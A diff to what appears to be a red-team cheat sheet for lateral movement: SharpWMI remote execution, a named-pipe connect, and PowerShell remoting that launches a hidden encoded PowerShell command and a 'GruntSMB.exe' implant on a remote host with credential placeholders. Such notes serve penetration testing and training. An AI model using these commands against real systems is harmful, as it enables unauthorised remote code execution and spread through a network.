@@ -51,7 +51,8 @@ SharpWMI /command:"action=exec computername=hostname command=\"C:\Temp\rasta3.ex
 
 connect hostname pipensvc
 
-PowerShellRemotingCommand wkstn-4945 "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand '' "
+PowerShellRemotingCommand hostname "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand '' "
+PowerShellRemotingCommand hostname "C:\users\n.lamb\AppData\Local\Temp\GruntSMB.exe" cyberbotic.io user password
 
 ---------------------------------------------------------------------------------------
 #DOMAIN RECONNAISSANCE
